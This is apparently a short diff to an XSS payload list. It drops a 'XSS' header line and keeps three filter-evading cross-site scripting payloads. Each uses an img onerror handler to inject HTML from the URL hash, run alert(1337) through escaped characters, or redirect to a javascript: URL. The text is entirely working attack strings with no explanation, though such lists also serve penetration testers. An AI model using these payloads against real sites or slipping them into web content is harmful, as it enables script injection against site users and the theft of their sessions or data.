@@ -1,4 +1,3 @@
-XSS
 <img src="" onerror="innerHTML=decodeURIComponent.call`${location.hash}`" "="">
 <img src="" onerror="innerHTML='<img/src/onerror=alert\u00281337\u0029>'" "="">
 <img src="" onerror="location=/javascript:/.source+location" "="">
